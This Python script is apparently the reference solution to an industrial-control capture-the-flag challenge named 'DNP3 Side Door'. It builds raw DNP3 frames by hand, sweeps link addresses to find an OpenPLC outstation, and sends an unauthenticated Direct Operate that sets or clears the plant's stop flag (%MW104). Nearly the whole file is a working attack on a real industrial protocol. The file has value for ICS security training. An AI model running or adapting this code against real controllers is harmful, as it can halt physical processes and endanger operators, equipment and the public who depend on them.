#!/usr/bin/env python3
"""Reference solution for the "DNP3 Side Door" challenge.

Speaks DNP3 to OpenPLC's outstation with nothing but the Python standard
library: every byte of the link, transport and application layers is built by
hand, and the CRC-16/DNP checksum is computed over each block.

    python3 dnp3_stop.py 172.18.0.3 discover   # find the link address pair
    python3 dnp3_stop.py 172.18.0.3 stop       # stop flag (%MW104) = 1
    python3 dnp3_stop.py 172.18.0.3 restart    # stop flag (%MW104) = 0

"discover" sends a Request Link Status for every destination/source pair up
to MAX_ADDRESS in one burst; only the pair the outstation is configured for
gets an answer, and the answer names both addresses. "stop" and "restart"
discover first, then send a Direct Operate (function 0x05) on an Analog Output
Int16 (group 41, variation 2) at index 1128. OpenPLC maps analog-output index
1024 + n onto %MWn, so 1128 is %MW104, the program's stop flag.

Target the PLC at its own address (172.18.0.3), not $DEVICE_IP, so the traffic
crosses the plant bridge where the IDS sees it.
"""
import socket
import struct
import sys

DNP3_PORT = 20000
MAX_ADDRESS = 100          # discovery sweeps link addresses 0..MAX_ADDRESS
STOP_INDEX = 1128          # analog-output index -> %MW104 (stop)

LINK_REQUEST_STATUS = 0xC9     # DIR=1, PRM=1, function 9
LINK_UNCONFIRMED_DATA = 0xC4   # DIR=1, PRM=1, function 4
FC_DIRECT_OPERATE = 0x05
STATUS_TEXT = {0: "SUCCESS", 3: "FORMAT_ERROR", 4: "NOT_SUPPORTED", 12: "OUT_OF_RANGE"}


def crc_dnp(data: bytes) -> bytes:
    """CRC-16/DNP of a block, as the two little-endian bytes sent after it."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return struct.pack("<H", ~crc & 0xFFFF)


def link_frame(control: int, dest: int, source: int, user: bytes = b"") -> bytes:
    """05 64, length, control, dest, source, header CRC, then 16-byte blocks + CRC."""
    header = bytes([0x05, 0x64, 5 + len(user), control]) + struct.pack("<HH", dest, source)
    frame = header + crc_dnp(header)
    for i in range(0, len(user), 16):
        block = user[i:i + 16]
        frame += block + crc_dnp(block)
    return frame


def direct_operate_ao16(index: int, value: int) -> bytes:
    """Transport + application bytes of a Direct Operate on one g41v2 point."""
    return bytes([
        0xC0,               # transport: FIR + FIN, sequence 0
        0xC1,               # application control: FIR + FIN, sequence 1
        FC_DIRECT_OPERATE,
        41, 2,              # group 41 (Analog Output), variation 2 (Int16)
        0x28,               # qualifier: 2-octet index prefix, 2-octet count
    ]) + struct.pack("<HHhB", 1, index, value, 0)   # count, index, value, status


def split_frames(data: bytes):
    """Yield (control, dest, source, user data) for each link frame in data."""
    pos = 0
    while pos + 10 <= len(data) and data[pos:pos + 2] == b"\x05\x64":
        length, control = data[pos + 2], data[pos + 3]
        dest, source = struct.unpack("<HH", data[pos + 4:pos + 8])
        size = length - 5
        user, cursor = b"", pos + 10
        while len(user) < size:
            take = min(16, size - len(user))
            user += data[cursor:cursor + take]
            cursor += take + 2
        yield control, dest, source, user
        pos = cursor


def receive(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def discover(host: str):
    """(outstation, master) link addresses, or None."""
    burst = b"".join(link_frame(LINK_REQUEST_STATUS, dest, source)
                     for dest in range(MAX_ADDRESS + 1)
                     for source in range(MAX_ADDRESS + 1))
    with socket.create_connection((host, DNP3_PORT), timeout=5) as sock:
        sock.sendall(burst)
        reply = receive(sock, 1.5)
    for control, dest, source, _ in split_frames(reply):
        if control & 0x0F == 0x0B:          # LINK_STATUS answer
            return source, dest             # it comes *from* the outstation
    return None


def operate(host: str, outstation: int, master: int, value: int) -> int:
    frame = link_frame(LINK_UNCONFIRMED_DATA, outstation, master,
                       direct_operate_ao16(STOP_INDEX, value))
    with socket.create_connection((host, DNP3_PORT), timeout=5) as sock:
        sock.sendall(frame)
        reply = receive(sock, 2.0)
    for _, _, _, user in split_frames(reply):
        # transport, app control, 0x81 response, 2 IIN bytes, then the echo
        if len(user) >= 5 and user[2] == 0x81:
            status = user[-1]
            print(f"Outstation answered: index {STOP_INDEX} = {value}, "
                  f"status {STATUS_TEXT.get(status, status)}")
            return 0 if status == 0 else 1
    print("No response from the outstation -- check the addresses and the frame.")
    return 1


def main() -> int:
    if len(sys.argv) != 3 or sys.argv[2] not in ("discover", "stop", "restart"):
        print(__doc__)
        return 2
    host, action = sys.argv[1], sys.argv[2]
    found = discover(host)
    if not found:
        print(f"No outstation answered for link addresses 0-{MAX_ADDRESS}.")
        return 1
    outstation, master = found
    print(f"Outstation link address {outstation}, it accepts master {master}.")
    if action == "discover":
        return 0
    return operate(host, outstation, master, 1 if action == "stop" else 0)


if __name__ == "__main__":
    sys.exit(main())
